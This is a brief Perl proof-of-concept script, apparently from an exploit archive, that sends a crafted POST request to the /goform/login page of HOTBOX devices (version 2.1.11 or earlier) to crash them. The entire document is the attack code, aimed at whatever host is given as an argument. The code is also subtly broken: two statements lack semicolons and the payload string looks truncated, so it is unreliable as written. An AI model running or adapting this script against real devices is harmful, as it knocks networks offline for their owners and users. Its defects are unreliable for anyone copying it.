use warnings;
use HTTP::Request::Common qw(POST);
use LWP::UserAgent;


# Author: Oz Elisyan
# Date: 3 September 2013
# Affected Version: <= 2.1.11

print "# HOTBOX DoS PoC #\n\n"

unless ($ARGV[0]){
	print "Please Enter Valid Host Name.\n";
	exit();
}

print "Sending Evil POST request...\n";

my $HOST = $ARGV[0];
my $URL = "http://$HOST/goform/login";
my $PostData = "loginUsername=aaaloginPassword=aaa"
my $browser = LWP::UserAgent->new();
my $req = HTTP::Request->new(POST => $URL);
$req->content_type("application/x-www-form-urlencoded");
$req->content($PostData);
my $resp = $browser->request($req);

print "Done.";
